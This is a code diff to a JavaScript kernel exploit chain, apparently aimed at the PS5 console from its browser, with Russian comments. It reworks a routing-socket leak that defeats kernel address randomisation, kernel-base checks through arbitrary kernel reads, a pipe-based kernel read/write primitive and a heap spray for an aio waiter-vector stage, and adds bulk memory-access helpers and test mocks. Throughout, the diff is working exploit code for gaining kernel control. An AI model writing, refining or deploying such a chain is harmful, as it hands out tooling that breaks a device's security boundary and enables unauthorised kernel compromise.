@@ -150,6 +150,12 @@ class KernelExploit1422 {
 
 	async sysInt(num, ...args) { return (await this.chain.syscall(num, ...args)).low | 0; }
 	alloc(size) { const b = this.p.malloc(size, 1); for (let i = 0; i < size; i += 4) this.p.write4(b.add32(i), 0); return b; }
+	async allocZeroed(size) {
+		const b = this.p.malloc(size, 1);
+		if (this.p && typeof this.p.writeBytes === "function") await this.p.writeBytes(b, new Uint8Array(size));
+		else for (let i = 0; i < size; i += 4) this.writeU32(b.add32(i), 0);
+		return b;
+	}
 	readU8(base, o) { return this.p.read1(base.add32(o)); }
 	readU32(base, o) { return this.p.read4(base.add32(o)); }
 	readU64(base, o) { return I64.of(this.p.read8(base.add32(o))); }
@@ -190,6 +196,15 @@ class KernelExploit1422 {
 		return out;
 	}
 	static u32(b, o = 0) { return (b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24)) >>> 0; }
+	static u64From(b, o = 0) { return new I64(KernelExploit1422.u32(b, o), KernelExploit1422.u32(b, o + 4)); }
+	// Чтение памяти ПРОЦЕССА (не ядра): если мост умеет readBytes — 1 round-trip,
+	// иначе побайтовый фолбэк (на консоли p.* локальные, там это дёшево).
+	async readProcessBytes(ptr, len) {
+		if (this.p && typeof this.p.readBytes === "function") return await this.p.readBytes(ptr, len);
+		const out = new Uint8Array(len);
+		for (let i = 0; i < len; i++) out[i] = this.readU8(ptr, i);
+		return out;
+	}
 	async kread8(addr) {
 		const b = await this.kreadBytes(addr, 8);
 		return { value: new I64(KernelExploit1422.u32(b, 0), KernelExploit1422.u32(b, 4)), rv: 0 };
@@ -272,156 +287,6 @@ class KernelExploit1422 {
 		}
 		this.log("Relapse1422: цепочка пройдена до конца");
 		return { kbase: this.kbase, done: true, payloads: last, stages: table };
-	}
-
-	// ------------------------------------------------- STAGE 1: KASLR (кандидаты)
-	// КАК В ОРИГИНАЛЕ и с учётом замечания webkit-1422: на этом шаге мы НЕ читаем
-	// память ядра (её ещё нельзя читать). Только: ответ routing-socket (память
-	// процесса через p.read*/leakval) + арифметика ret - retStatic.
-	// Вместо одной базы строим СПИСОК кандидатов по сетке KASLR PS5 (0x200000):
-	// база-предсказание и ±N страниц. Подтверждение allproc вынесено в STAGE 4,
-	// где R/W уже поднят.
-	async leakKernelBase() {
-		const kaslr = this.off.kaslr;
-		if (!kaslr) throw new Error("offsets.kaslr отсутствует");
-		if (kaslr.mode !== "rtmsg2") throw new Error("неизвестный режим KASLR: " + kaslr.mode);
-		if (!this.p || typeof this.p.read8 !== "function")
-			throw new BlockedError("userland-доступ к памяти процесса не подключён (p.read8) — нужен userland-примитив/leakval от моста");
-
-		let reply;
-		try {
-			reply = await this.routingSocketReply();
-		} catch (e) {
-			if (e instanceof BlockedError) throw e;
-			throw new BlockedError("routing socket недоступен: " + ((e && e.message) || e));
-		}
-		if (!reply) throw new BlockedError("routing socket не дал ответа (gated/закрыт) — KASLR не утёк; нужен syscall-backend (chain.rtmsg2)");
-		const author = this.findAuthorRecord(reply);
-		if (author === null || author === undefined) throw new Error("в ответе нет author-record");
-		const ret = this.readU64(reply, author + RET_SLOT);
-		this.log(`  author+${RET_SLOT} ret = 0x${ret.toString(16)}`);
-
-		const predict = I64.of(kaslr.retStatic);
-		const page = 0x200000;                                  // шаг KASLR на PS5
-		const pages = this.options.kaslrPages || 8;
-		const base0 = new I64((ret.low - predict.low) >>> 0, ret.hi);
-		const window = kaslr.window;
-		const cands = [base0];
-		// push(delta) сдвигает КАНДИДАТА базы; retStatic = predict - delta
-		const push = (delta) => {
-			const low = (base0.low + delta) >>> 0;
-			if (!cands.some((c) => c.low === low && c.hi === base0.hi)) cands.push(new I64(low, base0.hi));
-		};
-		// гипотеза 1: ошибка retStatic кратна странице KASLR (0x200000)
-		for (let k = 1; k <= pages; k++) { push(-k * page); push(k * page); }
-		// гипотеза 2: retStatic смещён внутри известного окна (шаг 0x1000) —
-		// именно этот перебор может набрать >=3 кандидатов и включить self-DoS guard
-		if (window) {
-			const half = Math.floor((window.hi - window.lo) / 2);
-			for (let d = 0x1000; d <= half; d += 0x1000) { push(-d); push(d); }
-		}
-		this.kbaseCandidates = cands;
-		this.candIndex = 0;
-		this.kbase = this.kbaseCandidates[0];
-		this.log(`  [KASLR] сетка 0x${page.toString(16)}: кандидатов ${this.kbaseCandidates.length}` +
-			` (первый 0x${this.kbase.toString(16)}, последний 0x${this.kbaseCandidates[this.kbaseCandidates.length - 1].toString(16)})`);
-		this.log(`  [KASLR] проверка allproc отложена до STAGE 4 (до поднятия R/W читать ядро нельзя)`);
-		return `кандидатов ${this.kbaseCandidates.length}, выбран 0x${this.kbase.toString(16)}`;
-	}
-
-	// ------------------------------------------------- STAGE 4: проверка базы
-	// Подтверждаем kbase чтением allproc через УЖЕ поднятый R/W. Перебираем
-	// кандидатов по одному; серия из 3 «мусорных» чтений останавливает перебор
-	// (self-DoS guard), чтобы не зависнуть на консоли.
-	async verifyKbaseStage() {
-		if (!this.rw) throw new BlockedError("kernel R/W не поднят — проверить базу нечем (STAGE 4 без R/W невозможен)");
-		const total = this.kbaseCandidates.length;
-		const maxGarbage = this.options.kaslrMaxMisses || 3;
-		const budgetMs = this.options.kaslrBudgetMs || 2000;
-		const t0 = Date.now();
-		let garbage = 0, checked = 0;
-		for (let i = this.candIndex; i < total; i++) {
-			if (Date.now() - t0 > budgetMs) { this.log(`  [verify] бюджет ${budgetMs} мс исчерпан после ${checked} кандидатов`); break; }
-			this.kbase = this.kbaseCandidates[i];
-			this.candIndex = i;
-			checked++;
-			this.log(`  [verify] кандидат ${i + 1}/${total}: база 0x${this.kbase.toString(16)}`);
-			const v = await this.probeKbaseArmed();
-			if (v === "ok") {
-				this.discovered.kbase = this.kbase.toString(16);
-				this.log(`  [verify] allproc подтвердила базу 0x${this.kbase.toString(16)} (кандидат ${i + 1}/${total})`);
-				return `kbase подтверждена (кандидат ${i + 1}/${total})`;
-			}
-			if (v === "garbage") garbage++;
-			if (garbage >= maxGarbage) {
-				this.log(`  [verify] STOP: ${garbage} мусорных чтений allproc подряд — self-DoS guard`);
-				break;
-			}
-		}
-		this.kbase = null;
-		this.log(`  KASLR not found in window (проверено ${checked} из ${total}, мусорных ${garbage}, ${Date.now() - t0} мс)`);
-		throw new Error(`KASLR not found in window — база не подтверждена после ${checked} кандидатов`);
-	}
-
-	// ok / garbage (прочитали, но не похоже на ядро) / unreadable (исключение)
-	async probeKbaseArmed() {
-		try {
-			const allproc = this.kaddr(this.off.allproc);
-			for (const o of [0x0, 0x8, 0x10]) {
-				const head = (await this.kread8(allproc.add32(o))).value;
-				if (this.isKernelPointer(head)) return "ok";
-			}
-			const kd = (await this.kread32(this.kaddr(this.off.kernelData))).value | 0;
-			if (kd !== 0 && kd !== -1) return "ok";
-			return "garbage";
-		} catch (e) {
-			if (e instanceof BlockedError) throw e;
-			return "unreadable";
-		}
-	}
-
-	async routingSocketReply() {
-		// В браузере PS5 routing socket доступен через syscall-обёртку пользователя
-		// (в оригинале — тот же путь). Если примитива нет — честно сообщаем.
-		if (this.chain && typeof this.chain.rtmsg2 === "function") {
-			const reply = await this.chain.rtmsg2();
-			if (!reply) return null;
-			return this.copyIntoProcess(reply);
-		}
-		if (this.options.rtmsgReply) return this.copyIntoProcess(this.options.rtmsgReply);
-		this.degraded("chain.rtmsg2 отсутствует; KASLR-ответ можно передать через options.rtmsgReply");
-		return null;
-	}
-	copyIntoProcess(bytes) {
-		const src = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
-		const buf = this.alloc(src.length + 16);
-		for (let i = 0; i < src.length; i++) this.writeU8(buf, i, src[i]);
-		this.replyLen = src.length;
-		return buf;
-	}
-	findAuthorRecord(replyPtr) {
-		// sockaddr_rtmsg2author лежит в конце сообщения; ищем маркер rtm_type==RTM_GET(4)
-		// и отдаём начало записи. Дополнительно допускаем позицию len-RET_SLOT-16.
-		for (let i = 0; i + 8 < this.replyLen; i += 4) {
-			if (this.readU8(replyPtr, i) === 0x04 && this.readU8(replyPtr, i + 1) === 0x00) return i;
-		}
-		return this.replyLen > RET_SLOT + 8 ? this.replyLen - RET_SLOT - 16 : null;
-	}
-
-	// --------------------------------------------- STAGE 2: affinity
-	async pinToSingleCore() {
-		const cur = this.alloc(0x10);
-		const id = new I64(0xffffffff, 0xffffffff);
-		await this.sysInt(SYS.CPUSET_GETAFFINITY, 3, 1, id, 0x10, cur);
-		const allowed = this.readU32(cur, 0) >>> 0;
-		let core = -1;
-		for (let c = 0; c < 16 && core < 0; c++) if (allowed & (1 << c)) core = c;
-		if (core < 0) throw new Error("нет разрешённых ядер в маске 0x" + allowed.toString(16));
-		const mask = this.alloc(0x10);
-		this.writeU8(mask, (core >> 3) & 0xf, 1 << (core & 7));
-		await this.sysInt(SYS.CPUSET_SETAFFINITY, 3, 1, id, 0x10, mask);
-		this.allowedMask = allowed;
-		return `core ${core} (маска 0x${allowed.toString(16)})`;
 	}
 
 	// ------------------------------------- STAGE 3: первое kernel R/W
@@ -525,9 +390,24 @@ class KernelExploit1422 {
 			throw new BlockedError("routing socket недоступен: " + ((e && e.message) || e));
 		}
 		if (!reply) throw new BlockedError("routing socket не дал ответа (gated/закрыт) — KASLR не утёк; нужен syscall-backend (chain.rtmsg2)");
-		const author = this.findAuthorRecord(reply);
-		if (author === null || author === undefined) throw new Error("в ответе нет author-record");
-		const ret = this.readU64(reply, author + RET_SLOT);
+		// ВНИМАНИЕ: в классе ДВЕ реализации leakKernelBase (вторая перекрывает первую).
+		// Обе должны понимать три вида ответа: {ptr,bytes} от моста, готовый буфер и указатель.
+		const replyBytes = await this.replyToBytes(reply);
+		const authorCands = this.findAuthorRecordCandidates(replyBytes);
+		const wantLow16 = kaslr.retLow16;
+		let author = null, ret = null;
+		for (const a of authorCands) {
+			const r = KernelExploit1422.u64From(replyBytes, a + RET_SLOT);
+			if (wantLow16 === undefined || (r.low & 0xffff) === wantLow16) { author = a; ret = r; break; }
+		}
+		if (author === null) {
+			const head = Array.from(replyBytes.slice(0, 48)).map((x) => x.toString(16).padStart(2, "0")).join(" ");
+			this.log(`  [kaslr] ДИАГНОСТИКА: len=${replyBytes.length}, первые 48 байт = ${head}`);
+			this.log(`  [kaslr] кандидаты author = [${authorCands.join(", ")}], искали retLow16=0x${(wantLow16 || 0).toString(16)}`);
+			throw new Error("в ответе нет author-record");
+		}
+		this.log(`  [kaslr] ответ ${replyBytes.length} байт, author-record @+${author}`);
+		this.log(`  [kaslr] ответ сокета прочитан бульком: ${replyBytes.length} байт (readBytes=${typeof this.p.readBytes === "function"})`);
 		this.log(`  author+${RET_SLOT} ret = 0x${ret.toString(16)}`);
 
 		const predict = I64.of(kaslr.retStatic);
@@ -628,6 +508,41 @@ class KernelExploit1422 {
 		this.replyLen = src.length;
 		return buf;
 	}
+	// Любой вид ответа -> байты. Виды: {ptr,bytes} (мост), готовый буфер/массив, указатель.
+	// Ловушка, на которой падала стадия 1 через TCP: {ptr,bytes} принимали за указатель.
+	static toBytes(v) {
+		if (!v) return null;
+		if (v instanceof Uint8Array) return v;
+		if (ArrayBuffer.isView(v)) return new Uint8Array(v.buffer, v.byteOffset, v.byteLength);
+		if (Array.isArray(v)) return Uint8Array.from(v);
+		if (typeof v === "object" && typeof v.length === "number") {
+			try { return Uint8Array.from(v); } catch (e) { return null; }
+		}
+		return null;
+	}
+	async replyToBytes(reply) {
+		const direct = KernelExploit1422.toBytes(reply);
+		if (direct) return direct;
+		const inner = KernelExploit1422.toBytes(reply && reply.bytes);
+		if (inner) return inner;
+		const ptr = (reply && reply.ptr) || reply;
+		const len = (reply && reply.bytes && reply.bytes.length) || this.replyLen || 512;
+		if (this.p && typeof this.p.readBytes === "function") {
+			const b = KernelExploit1422.toBytes(await this.p.readBytes(ptr, len));
+			if (b) return b;
+		}
+		return await this.readProcessBytes(ptr, len + 16);
+	}
+	findAuthorRecordCandidates(bytes) {
+		const out = [];
+		for (let i = 0; i + 8 < bytes.length; i += 4) {
+			if (bytes[i] === 0x04 && bytes[i + 1] === 0x00) out.push(i);
+		}
+		if (bytes.length > RET_SLOT + 8) out.push(bytes.length - RET_SLOT - 16);
+		out.push(0);
+		return [...new Set(out)].filter((o) => o >= 0 && o + RET_SLOT + 8 <= bytes.length);
+	}
+	findAuthorRecordIn(bytes) { return this.findAuthorRecordCandidates(bytes)[0] ?? null; }
 	findAuthorRecord(replyPtr) {
 		// sockaddr_rtmsg2author лежит в конце сообщения; ищем маркер rtm_type==RTM_GET(4)
 		// и отдаём начало записи. Дополнительно допускаем позицию len-RET_SLOT-16.
@@ -907,8 +822,12 @@ class KernelExploit1422 {
 		// Переводим pipe-доступ в armed-примитив: read(addr,len) / write(addr,bytes)
 		this.attachKernelRw({
 			read: async (addr, len) => {
-				// если мост умеет бульк-чтение — используем его (1 round-trip вместо len)
-				if (this.p && typeof this.p.readBytes === "function") return await this.p.readBytes(addr, len);
+				// ВАЖНО: это чтение ПАМЯТИ ЯДРА через pipe, поэтому p.readBytes (память процесса)
+				// здесь не подходит. Бульк-путь — только pipeReadBytes, если мост его даёт.
+				if (this.p && typeof this.p.pipeReadBytes === "function") {
+					const b = await this.p.pipeReadBytes(addr, len);
+					if (b && b.length === len) return b;
+				}
 				const out = this.p.malloc(len, 1);
 				const rv = await this.p.pipeRead(addr, len, out);
 				if (rv !== len) throw new Error(`pipeRead вернул ${rv} вместо ${len}`);
@@ -1193,8 +1112,8 @@ export async function armViaWaiterVector(kx, oid) {
 	const T = kx.tuning;
 	kx.log(`  [waiter] waiters=${T.waiters} requests=${T.requests} sprays=${T.sprays} waiterSize=0x${waiterSize.toString(16)}`);
 	if (waiterSize !== 0x38) kx.log(`  [waiter] ВНИМАНИЕ: waiterSize 0x${waiterSize.toString(16)} != 0x38 — структура могла измениться`);
-	const ids = kx.alloc(T.waiters * 4);
-	const states = kx.alloc(T.waiters * 8);
+	const ids = await kx.allocZeroed(T.waiters * 4);
+	const states = await kx.allocZeroed(T.waiters * 8);
 	// ВАЖНО (дизасм 13.60, recon/aio-waiter-vector.md): syscall 661 (aio_submit) —
 	// это nosys-трамплин `jmp 0x265760`, реальная отправка идёт через 669
 	// (aio_submit_cmd, handler RVA 0x3b2060, строка "_aio_submit_cmd" @0x1379d6c),
@@ -1218,10 +1137,21 @@ export async function armViaWaiterVector(kx, oid) {
 		kx.chain.add_syscall_ret(kx.alloc(8), SYS.AIO_MULTI_POLL, ids, T.waiters, states);
 	}
 	const sprayLen = T.sprays * waiterSize;
-	const spray = kx.alloc(sprayLen);
-	for (let i = 0; i < T.sprays; i++) {
-		kx.writeU32(spray, i * waiterSize, 0x41414141);
-		kx.writeU32(spray, i * waiterSize + 4, 0x42424242);
+	const spray = kx.p.malloc(sprayLen, 1);
+	if (kx.p && typeof kx.p.writeBytes === "function") {
+		const buf = new Uint8Array(sprayLen);
+		for (let i = 0; i < T.sprays; i++) {
+			const o = i * waiterSize;
+			buf[o] = 0x41; buf[o + 1] = 0x41; buf[o + 2] = 0x41; buf[o + 3] = 0x41;
+			buf[o + 4] = 0x42; buf[o + 5] = 0x42; buf[o + 6] = 0x42; buf[o + 7] = 0x42;
+		}
+		await kx.p.writeBytes(spray, buf);
+		kx.log(`  [waiter] spray ${sprayLen} байт записан bulk-методом writeBytes (1 round-trip)`);
+	} else {
+		for (let i = 0; i < T.sprays; i++) {
+			kx.writeU32(spray, i * waiterSize, 0x41414141);
+			kx.writeU32(spray, i * waiterSize + 4, 0x42424242);
+		}
 	}
 	kx.armedGroups.push(Array.from({ length: T.waiters }, (_, i) => i));
 	kx.log(`  [waiter] группа вооружена: ${T.waiters} заявок, spray ${sprayLen} байт`);
@@ -1372,6 +1302,17 @@ function makeDryRunMocks(badKernel, noOid, full) {
 	if (full) {
 		// «настоящий» примитив: готов, умеет pipe-доступ (стадия 8 не деградирует)
 		p.ready = () => true;
+		p.readBytes = async (ptr, len) => {   // бульк-чтение памяти процесса
+			const o = addrOf(ptr); const out = new Uint8Array(len);
+			for (let i = 0; i < len; i++) out[i] = (o + i) < MEM ? mem[o + i] : 0;
+			return out;
+		};
+		p.writeBytes = async (ptr, bytes) => { // бульк-запись памяти процесса
+			const o = addrOf(ptr);
+			for (let i = 0; i < bytes.length; i++) if ((o + i) < MEM) mem[o + i] = bytes[i];
+			return bytes.length;
+		};
+		p.pipeReadBytes = async (addr, len) => readBytes(addr, len);   // bulk kernel read via pipe
 		p.pipeRead = async (addr, len, out) => { const b = readBytes(addr, len); for (let i = 0; i < len; i++) p.write1(out.add32(i), b[i]); return len; };
 		p.pipeWrite = async (addr, val, len) => {
 			const bytes = new Uint8Array(len);
